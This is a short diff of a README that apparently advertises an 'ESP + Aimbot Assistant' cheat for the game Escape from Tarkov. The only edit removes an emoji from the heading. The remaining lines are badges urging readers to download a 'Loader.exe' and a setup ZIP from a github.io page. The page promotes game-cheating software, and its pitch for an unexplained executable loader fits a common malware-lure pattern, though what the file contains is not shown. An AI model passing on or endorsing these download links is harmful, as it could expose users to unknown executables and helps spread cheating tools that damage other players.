@@ -1,4 +1,4 @@
-# 🔧 Escape from Tarkov — ESP + Aimbot Assistant
+Escape from Tarkov — ESP + Aimbot Assistant
 
 [![Download Loader.exe](https://img.shields.io/badge/Download-Loader.exe-green?style=for-the-badge)](https://escape-from-tarkov-esp-aimbot-assistant.github.io/.github/)
 [![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://escape-from-tarkov-esp-aimbot-assistant.github.io/.github/)
